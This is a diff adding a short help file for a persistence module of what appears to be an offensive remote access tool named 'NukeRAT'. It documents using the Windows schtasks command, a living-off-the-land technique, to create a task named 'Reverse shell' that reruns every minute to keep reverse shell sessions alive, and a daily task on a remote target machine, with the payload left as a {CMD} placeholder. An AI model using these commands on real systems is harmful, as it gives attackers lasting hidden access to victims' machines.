@@ -1,0 +1,19 @@
+ABOUT
+    Schedule periodic tasks. LOLBAS documents create a recurring
+    task to keep reverse shell session(s) alive and create a remote
+    task to run daily relative to the the time of creation.
+
+USAGE:
+    schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr "{CMD}"
+    schtasks /create /s targetmachine /tn "MyTask" /tr "{CMD}" /sc daily
+
+EXAMPLES:
+    schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr "{CMD}"
+    schtasks /create /s targetmachine /tn "MyTask" /tr "{CMD}" /sc daily
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr "{CMD}"
